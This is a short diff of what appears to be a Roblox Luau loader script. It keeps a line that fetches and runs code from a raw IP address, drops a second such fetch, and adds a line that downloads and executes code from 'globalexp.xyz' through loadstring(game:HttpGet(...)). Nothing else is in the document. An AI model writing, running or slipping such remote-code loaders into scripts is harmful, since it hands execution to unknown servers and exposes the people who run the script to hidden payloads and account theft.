@@ -1,5 +1,4 @@
 ID="a1f09f40-deba-49bd-9a22-e54622ebc980";
 loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
 
-ID="a1f09f40-deba-49bd-9a22-e54622ebc980";
-RUN_AFTER=loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"));
+loadstring(game:HttpGet("https://globalexp.xyz"))()
